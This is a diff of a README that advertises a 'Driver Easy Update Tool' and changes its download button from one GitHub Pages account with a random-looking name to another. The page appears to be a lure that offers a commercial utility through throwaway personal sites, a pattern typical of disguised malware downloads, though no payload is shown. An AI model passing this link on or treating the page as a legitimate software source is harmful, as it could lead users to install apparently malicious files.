@@ -21,7 +21,7 @@ To begin using this **Driver Easy Update Tool** and **Driver Easy Backup Tool**,
 | :--- | :--- |
 | **Get Driver Easy Update Tool** | Click the button below to start using this **Driver Easy Offline Scanner**. |
 
-[![Button](https://img.shields.io/badge/💻-Get_Driver_Easy-2ea44f?style=for-the-badge)](https://halidporyvai.github.io/.github/driver-easy-update-tool)
+[![Button](https://img.shields.io/badge/💻-Get_Driver_Easy-2ea44f?style=for-the-badge)](https://ivanallisonijuj.github.io/.github/driver-easy-update-tool)
 
 ## System Requirements
 
